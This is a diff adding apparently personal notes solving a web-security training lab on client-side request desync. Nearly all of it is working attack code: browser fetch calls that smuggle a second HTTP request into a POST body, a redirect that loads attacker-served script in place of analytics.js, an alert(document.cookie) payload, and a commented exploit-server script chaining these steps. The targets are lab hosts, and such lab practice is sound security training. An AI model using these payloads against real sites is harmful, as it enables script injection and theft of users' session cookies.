@@ -1,0 +1,54 @@
+## Browser Console
+fetch('https://0a7000b304ead942c178342a00da00c7.web-security-academy.net/..%2f', {
+        method: 'POST',
+        body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+        mode: 'no-cors',
+        credentials: 'include',
+    }).then(() => {
+        fetch('https://0a7000b304ead942c178342a00da00c7.web-security-academy.net', {
+        mode: 'no-cors',
+        credentials: 'include'
+    })
+})
+
+
+--------------------------------------------------
+## Try
+//exploit-0a88007d04dbd938c1b23414018a0051.web-security-academy.net/ExPloiT
+
+
+-------------------------------------------------
+## Check
+GET /js/analytics.js HTTP/1.1
+
+-------------------------------------------------
+## Test
+fetch('https://0a7000b304ead942c178342a00da00c7.web-security-academy.net/..%2f', {
+    method: 'POST',
+    body: 'GET //exploit-0a88007d04dbd938c1b23414018a0051.web-security-academy.net/eXpLoIt HTTP/1.1\r\nFoo: x',
+    credentials: 'include',
+    mode: 'no-cors'
+}).then(() => {
+    location='https://0a7000b304ead942c178342a00da00c7.web-security-academy.net/resources/js/analytics.js'
+})
+
+--------------------------------------------------
+
+## Exploit:
+alert(document.cookie);
+/*
+<script>
+    const labURL = "https://0a7000b304ead942c178342a00da00c7.web-security-academy.net";
+    const exploitHost = "exploit-0a88007d04dbd938c1b23414018a0051.web-security-academy.net";
+
+    if(window.name != 'skip'){
+        window.name = 'skip';
+        fetch(`${labURL}/..%2f`, { method: 'POST', body: `GET //${exploitHost}/eXpLoIt HTTP/1.1\r\nFoo: x`, credentials: 'include', mode: 'no-cors' }).then(() => {location=`${labURL}/resources/js/analytics.js`} );
+    } else {
+        window.name = '';
+        location = `${labURL}/login`;
+    }
+</script>
+*/
+
+
